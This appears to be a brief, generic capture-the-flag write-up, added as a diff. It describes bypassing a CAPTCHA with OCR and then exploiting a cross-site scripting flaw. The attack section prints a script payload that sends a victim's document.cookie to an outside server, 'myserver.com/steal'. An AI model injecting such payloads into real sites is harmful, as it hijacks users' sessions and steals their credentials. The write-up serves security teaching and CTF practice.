@@ -1,0 +1,18 @@
+Title: Bypassing CAPTCHA to Exploit a Web Application Vulnerability
+Primary topic: Web Exploitation
+Secondary topic: CAPTCHA Bypassing
+Tools used: Burp Suite, OCR
+Keywords: CAPTCHA, XSS, payload, flag, security
+
+#overview
+The author participated in a CTF event and encountered a web application that implemented a CAPTCHA mechanism to prevent automated attacks. The author suspected that there might be other vulnerabilities present in the application that could be exploited once the CAPTCHA was bypassed. The author used various techniques to bypass the CAPTCHA and discovered a Cross-Site Scripting (XSS) vulnerability in one of the input fields.
+
+#analysis
+To bypass the CAPTCHA, the author analyzed the CAPTCHA generation algorithm, exploited weaknesses in its implementation, and used OCR tools to automatically solve the CAPTCHA challenges. After successfully bypassing the CAPTCHA, the author focused on identifying other vulnerabilities in the web application. Through manual testing and using automated tools like Burp Suite, the author discovered a Cross-Site Scripting (XSS) vulnerability in one of the input fields.
+
+#attack_execution
+To exploit the XSS vulnerability and obtain the flag for the Web Exploitation challenge, the author crafted a payload that would execute JavaScript code to retrieve the flag from the application's DOM or make a request to a sensitive endpoint. The author injected the following script: `<script>document.location='http://myserver.com/steal?flag='+encodeURIComponent(document.cookie);</script>`. Upon submitting the payload, the web application executed the malicious script, which sent the flag to the author's server, allowing the author to complete the challenge.
+
+[CODE_REMOVED]
+
+This CTF writeup highlights the importance of thoroughly securing web applications, even when security mechanisms like CAPTCHAs are in place. By bypassing the CAPTCHA and exploiting the XSS vulnerability, the author was able to obtain the flag needed to complete the challenge.
